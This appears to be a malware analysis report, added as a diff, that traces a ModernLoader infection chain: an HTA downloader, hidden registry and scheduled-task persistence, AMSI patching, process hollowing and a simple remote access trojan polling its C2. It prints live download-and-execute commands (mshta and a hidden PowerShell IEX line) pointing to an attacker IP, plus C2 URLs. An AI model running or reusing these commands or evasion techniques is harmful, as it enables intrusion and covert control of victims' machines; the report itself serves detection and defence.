@@ -1,0 +1,88 @@
+Initial finding: A command executed on the system.
+
+The 31.41.244.231 IP is a Russian IP and hosts several other URLs with similar naming conventions.
+
+The first command connects to the download server and downloads an HTA application whose script is obfuscated with HTML Guardian, an application that encrypts HTML code.
+cmd /c mshta http://31.41.244.231/0x?0=Loader
+The content displayed when the HTA file is opened in a browser.
+
+When deobfuscated, the HTA file executes the VB script code to download and run PowerShell code from hxxp://31.41.244.231/0x?0=Loader, which launches the next stage of the loading process.
+powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://31.41.244.231/0x?0=Loader')
+Deobfuscated HTA code.
+
+The autorunnn.exe module (d9c8e82c42e489ac7a484cb98fed40980d63952be9a88ff9538fc23f7d4eb27f) is a modified variant of the SharpHide open-source utility, which attempts to create a hidden registry entry.
+
+It uses NtSetValueKey native API to create a hidden (null-terminated) registry key by adding a null byte in front of the UNICODE_STRING key valuename.
+
+\HKLM|HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\shell set to run the command: "explorer.exe, cmd /c  mshta hxxp://go.clss.cl/0k#=GoogleWindowsAnalyticsConfiguration".
+
+The program also attempts to create a scheduled task which runs when the user logs onto the system.
+
+The task name is "OneDrive Standalone Update Task" and it will attempt to execute the sams  command to download and run the PowerShell loader: "mshta hxxp://go.clss.cl/0k#=GoogleWindowsAnalyticsConfiguration".
+
+Modified SharpHide code is used to hide registry startup entry.
+
+The URL serves PowerShell code which will be executed on the system.
+
+As part of the logon sequence, the system executes a file, which ensures that the registry entry and the scheduled task set to download the next stage are set.
+
+The next stage is the PowerShell loader.
+
+The loader contains embedded code of three modules, which are loaded using reflection as additional .NET assemblies into the PowerShell process space.
+
+The downloaded PowerShell code also downloads and runs auxiliary modules and payloads.
+
+The first disables AMSI scanning functionality, the second is the final payload, and the last injects the payload into the process space of a newly created process, usually RegSvcs.exe.
+
+Killamsi.dll is stored as a base64-encoded string split between the first two encoded characters and the rest of the encoded assembly DLL.
+
+The DLL contains obfuscated code, which attempts to patch Microsoft's AMSI interface (amsi.dll) AmsiScanBuffer function with the code to return an error value.
+
+Amsi.dll is decoded, loaded and its Main function called.
+
+The last module in the loader file is "friday.dll".
+
+It is obfuscated with multiple layers of obfuscation, such as ConfuserEx and Dotnet reactor.
+
+It creates a new process and places the next injector stage into the newly created RegSvcs.exe process.
+
+Friday.dll module is used to inject the next injection stage into RegSvcs.exe process.
+
+The second-stage injector is an assembly: Managament.inf.
+
+It creates an instance of svchost.exe process and injects code using process-hollowing to load the final payload stored in the initial PowerShell loader script.
+
+The injector creates a svchost.exe process in suspended mode and then allocates virtual memory for the injection of the payload module.
+
+The original svchost module is unmapped by calling the ZwUnmapViewOfSection.
+
+This is followed by the fairly common injection sequence of API calls to get thread context, copy the data from the payload to the allocated virtual memory, set the thread context to point to the payload entry point and, finally, to resume the suspended thread.
+
+Depending on the bitness of the operating system, the appropriate functions are used for getting and setting the thread contexts of the 32 bit process from the 64 bit operating system.
+
+The injected payload is Client.exe (3f5856a9ec23f6daf20fe9e42e56da1b8dcb0de66b6628a92b554d6e17c02fc3), a ModernLoader instance.
+
+The payload for the initial loader URL is a simple .NET remote access trojan, ModernLoader.
+
+ModernLoader' s constructor initializes the bot with a hardcoded C2 URL.
+
+Once the bot is initialized, it collects the following information about the system and send the information to the C2 server using the HTTP Post request to hxxp://31.41.244.231/AVAVA/gate.php:
+
+Win32_ComputerSystemProduct UUID (using WMI to query the configuration data).
+
+The external IP address by reading the response from http://ipinfo.io/ip.
+
+The IP address country by reading the response from http://ipinfo.io/country.
+
+The user privileges (admin or user).
+
+Once the initial data is sent, ModerLoader reads the response to find tasks returned from the servers using the JSON format.
+
+ModernLoader executes tasks using the function DoTask.
+
+DoTask accepts very few commands and can either execute a command line or download and execute a file.
+
+ModernLoader runs in an endless loop periodically contacting the C2 server for new tasks until the process is terminated.
+
+Its main purpose is to download and execute additional payloads and modules, as instructed by the C2 server.
+
